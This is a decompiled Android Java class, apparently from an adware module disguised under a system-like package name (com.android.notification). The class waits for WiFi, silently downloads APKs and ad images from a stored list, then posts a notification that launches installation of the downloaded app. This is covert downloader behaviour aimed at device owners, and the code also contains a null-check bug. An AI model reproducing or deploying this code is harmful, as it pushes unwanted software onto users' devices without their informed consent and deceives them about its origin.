package com.android.notification;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.widget.RemoteViews;
import com.android.notification.bean.DownApkInfo;
import com.android.notification.bean.ResID;
import com.android.notification.configure.ConfigureFile;
import com.android.notification.configure.DownApkXmlKey;
import com.android.notification.configure.DownStatus;
import com.android.notification.configure.WebFlag;
import com.android.notification.util.AppUtil;
import com.android.notification.util.Tool;
import java.io.File;
import java.io.IOException;
import java.util.List;
import u.aly.bs;

public class DownThread extends Thread {
    private Context context = null;
    private Intent intent = null;
    private DownApkInfo mCruApp = null;
    private List<DownApkInfo> mDownInfos;

    public DownThread(Context context, Intent intent) {
        this.context = context;
        this.intent = intent;
    }

    public void run() {
        try {
            Tool.JWDlog(DownApkXmlKey.ROOT, "class:MainService  func:onStart  text:WIFI wait 4 mins....");
            Thread.sleep(180000);
            if (AppUtil.getWebStatus(this.context, this.intent).equals(WebFlag.WIFI)) {
                GetDownInfo();
            }
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void GetDownInfo() {
        try {
            Tool.JWDlog(DownApkXmlKey.ROOT, "class:MainService  func:onStart  text:WIFI down start");
            this.mDownInfos = AppUtil.ReadDownLoadInfoList(ConfigureFile.DownInfoFile);
            if (this.mDownInfos != null && this.mDownInfos.size() > 0) {
                DownAllRecord();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void DownSingleRecord() {
        if (this.mCruApp == null) {
            this.mCruApp.setAdFlag(DownStatus.DOWN_ERROR);
            try {
                AppUtil.WriteDownLoadInfo(ConfigureFile.DownInfoFile, this.mCruApp, 1);
                return;
            } catch (IOException e1) {
                e1.printStackTrace();
                return;
            }
        }
        boolean ifNotiSend = true;
        try {
            if (DownStatus.DOWN_OK == this.mCruApp.getAdFlag()) {
                ifNotiSend = false;
            }
            AppUtil.toDwonApk(this.mCruApp, 3, this.context);
            UpdatemCruApp();
            if (DownStatus.DOWN_OK == this.mCruApp.getAdFlag() && ifNotiSend) {
                setNotiID(this.mCruApp);
            }
        } catch (IOException e) {
            e.printStackTrace();
            if (DownStatus.DOWN_NOW == this.mCruApp.getAdFlag()) {
                this.mCruApp.setAdFlag(DownStatus.DOWN_ERROR);
                try {
                    AppUtil.WriteDownLoadInfo(ConfigureFile.DownInfoFile, this.mCruApp, 1);
                } catch (IOException e12) {
                    e12.printStackTrace();
                }
            }
        }
    }

    private void DownSingleAd() {
        if (this.mCruApp != null) {
            try {
                if (DownStatus.DOWN_OK != this.mCruApp.getImgFlag() && DownStatus.DOWN_NOW != this.mCruApp.getImgFlag()) {
                    this.mCruApp.setImgFlag(DownStatus.DOWN_NOW);
                    AppUtil.WriteDownLoadInfo(ConfigureFile.DownInfoFile, this.mCruApp, 1);
                    if (AppUtil.DownloadImg(this.mCruApp, 1, 0, 1)) {
                        this.mCruApp.setImgFlag(DownStatus.DOWN_OK);
                        this.mCruApp.setDownFlag(DownStatus.DOWN_OK);
                        AppUtil.WriteDownLoadInfo(ConfigureFile.DownInfoFile, this.mCruApp, 1);
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
                this.mCruApp.setImgFlag(DownStatus.DOWN_ERROR);
                this.mCruApp.setDownFlag(DownStatus.DOWN_ERROR);
                try {
                    AppUtil.WriteDownLoadInfo(ConfigureFile.DownInfoFile, this.mCruApp, 1);
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
            }
        }
    }

    private void DownAllApk() {
        DownSingleRecord();
    }

    private String GetApkName(DownApkInfo downinfo) {
        String[] akp = downinfo.getAdUrl().split("/");
        String apkName = bs.b;
        String temp = akp[akp.length - 1].trim();
        if (temp.length() > 4) {
            apkName = temp.substring(0, temp.length() - 4);
        }
        return "   " + apkName;
    }

    private void setNotiID(DownApkInfo downinfo) {
        int APPNOTI_ID = Tool.ChangeStrToInt(String.valueOf(20120208) + downinfo.getAdID());
        NotificationManager notificationMagager = (NotificationManager) this.context.getSystemService("notification");
        notificationMagager.cancel(APPNOTI_ID);
        Notification notification = new Notification();
        notification.icon = 17301634;
        String str = downinfo.getAdFlie();
        Intent apkintent = new Intent("android.intent.action.VIEW");
        apkintent.setDataAndType(Uri.fromFile(new File(str)), "application/vnd.android.package-archive");
        notification.contentIntent = PendingIntent.getActivity(this.context, 0, apkintent, 0);
        notification.contentView = new RemoteViews(this.context.getPackageName(), ResID.getJwdappprogress());
        notification.contentView.setTextViewText(ResID.getJwdtextdown(), "下载完成");
        notification.contentView.setTextViewText(ResID.getJwdapkname(), GetApkName(downinfo));
        notification.flags = 16;
        notification.contentView.setViewVisibility(ResID.getJwdnotiprogress(), 4);
        notificationMagager.notify(APPNOTI_ID, notification);
    }

    private void DownAllAd() {
        DownSingleAd();
    }

    private void UpdatemCruApp() throws IOException {
        DownApkInfo tempInfo = AppUtil.ReadDownLoadInfo(ConfigureFile.DownInfoFile, this.mCruApp.getAdID());
        if (tempInfo != null) {
            this.mCruApp = tempInfo;
        }
    }

    private void DownAllRecord() {
        if (this.mDownInfos != null) {
            for (int nI = 0; nI < this.mDownInfos.size(); nI++) {
                this.mCruApp = (DownApkInfo) this.mDownInfos.get(nI);
                try {
                    UpdatemCruApp();
                    if (this.mCruApp != null) {
                        if (this.mCruApp.getAdType() != 0) {
                            DownAllApk();
                        } else if (Tool.IfAPKOk(this.mCruApp.getAdUrl())) {
                            DownAllApk();
                        } else {
                            DownAllAd();
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
